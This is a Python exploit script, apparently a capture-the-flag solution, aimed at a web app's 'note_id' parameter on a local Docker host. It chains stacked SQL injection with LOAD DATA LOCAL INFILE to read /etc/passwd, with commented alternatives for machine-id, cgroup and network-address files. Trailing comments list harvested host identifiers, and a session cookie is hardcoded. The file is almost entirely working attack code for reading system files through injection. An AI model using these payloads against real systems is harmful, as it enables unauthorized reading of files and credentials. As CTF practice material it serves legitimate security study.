import random
import requests

session = requests.Session()
table_name = "".join(random.sample('zyxwvutsrqponmlkjihgfedcba', 5))
# file = '/sys/class/net/eth0/address'
file = '/etc/passwd'
# file = '/proc/self/cgroup'
# file = '/etc/machine-id'
payload1 = f'''1';create table {table_name}(name varchar(30000));load data  local infile "{file}" into table ctf.{table_name} FIELDS TERMINATED BY '\n';#'''
payload2 = f'''1' union select 1,2,3,4,(select GROUP_CONCAT(NAME) from ctf.{table_name})#'''
paramsGet1 = {"note_id": payload1}
paramsGet2 = {"note_id": payload2}
headers = {"Cache-Control": "max-age=0",
           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
           "Upgrade-Insecure-Requests": "1",
           "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
           "Connection": "close", "Accept-Encoding": "gzip, deflate",
           "Accept-Language": "zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6"}
cookies = {
    "session": "eyJjc3JmX3Rva2VuIjoiM2MzNTIxMjNkYzQ0M2IzMzM2OTcyNTc1YTMwZTQxYjhkMTQxZDM5ZiIsInVzZXJuYW1lIjoiYXNkYSJ9.YmzZgw.pwaMg-fLn3K-mr6TUxFs1kG3eKU"}

response1 = session.get("http://172.17.0.1:5002/view", params=paramsGet1, headers=headers, cookies=cookies)
response2 = session.get("http://172.17.0.1:5002/view", params=paramsGet2, headers=headers, cookies=cookies)
print(response2.text)

# address 02:42:ac:13:00:02
# machine-id 1cc402dd0e11d5ae18db04a6de87223d
# cgroup 1:net_cls:/,0::/
# boot_id: 9f7abfc3-a132-4994-a923-421935597601
